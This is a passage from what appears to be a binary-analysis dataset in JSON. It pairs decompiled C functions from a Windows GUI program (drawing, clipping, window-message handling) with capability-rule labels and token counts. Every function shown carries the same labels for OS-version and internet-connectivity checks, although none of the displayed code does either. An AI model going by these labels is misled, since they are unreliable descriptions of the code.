        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450230(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4502b1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db40(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x4502b8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 392
    },
    "004503cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004503cc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x49ac84 == 0)) && (*0x450434 == (*0x450430 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.00451ae8(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "0045095c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045095c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "004509f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004509f8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00450a1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450a1c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00450b54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00450b54(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450bea;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00407550();\n        fcn.0040db40(uVar2, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x450bf1);\n    return;\n}\n",
        "token_count": 396
    },
    "00450bfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450bfc(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.00419910();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.004198b4();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.00450150();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 278
    },
    "00450c88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450c88(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.004588a0();\n    if (cVar2 != '\\0') {\n        fcn.00450150();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.00450bfc(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.00458594(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00450d28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450d28(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 174
    },
    "00450d70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450d70(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    piVar1 = fcn.0043bd2c();\n    piVar2 = fcn.0044d5dc();\n    if ((((piVar2 != NULL) && (piVar1 != piVar2)) && (in_EAX != piVar2)) && (piVar2[0xc] == 0)) {\n        (**(*piVar2 + 0x78))();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        if ((piVar1 == NULL) || (in_EAX == piVar1)) {\n            arg_8h = *(param_2 + 8);\n            uVar3 = fcn.00451ae8(arg_8h);\n            *(arg_8h + 0xc) = uVar3;\n        }\n        else {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00450e04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450e04(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x450e49;\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x450e69;\n                uStack20 = fcn.00458594();\n                puStack24 = 0x450e6f;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x450edd;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00455e84();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.00458594(uVar2, 0x450efa);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x450eef;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x450efa;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "00450f04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450f04(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "00450f34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450f34(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "00451068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451068(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004510a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004510a4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004510f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004510f0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00451208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451208(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00451288": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.00451288(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.0040484c();\n            }\n            else {\n                var_ah = fcn.0040484c();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 426
    },
    "004513f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004513f4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x451409;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x451430;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x451443;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x45150f;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.004513f4::var_1h + 1;\n    uVar4 = fcn.00424f98();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x451516);\n    return;\n}\n",
        "token_count": 786
    },
    "00451540": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451540(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint uStack23;\n    \n    cVar1 = fcn.004047dc();\n    if ((*0x49ac88 != '\\0') && (cVar1 == '\\0')) {\n        fcn.00404800();\n    }\n    fcn.00450370();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.0040484c(uStack23);\n        }\n        else {\n            fcn.0040484c(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "00451630": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00451630(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00418428();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.004502c0();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.00458594();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.004507bc();\n        arg_8h_00 = &fcn.00451630::var_34h;\n        uStack80 = 0x4516e1;\n        fcn.004507d0();\n        uStack80 = 0x4516ee;\n        fcn.0041848c(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x451702;\n        var_5h = fcn.00451810();\n        goto code_r0x00451803;\n    }\n    fcn.00451b1c();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x00451735:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') goto code_r0x00451735;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.0044dba4();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00458594();\n        }\n        fcn.00450150();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.00451630::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.00458594(&fcn.00451630::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.0040484c();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00404650(0x451803);\n        return uVar4;\n    }\ncode_r0x00451803:\n    return var_5h;\n}\n",
        "token_count": 985
    },
    "004518b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004518b8(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xb2) != 0) {\n        (**(in_EAX + 0xb0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 112
    },
    "00451984": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451984(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00451a14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451a14(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00451b1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00451b1c(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 309
    },
    "00451bc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451bc4(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.0043bd2c(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.004503cc(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x451c9d\n                switch(*param_2) 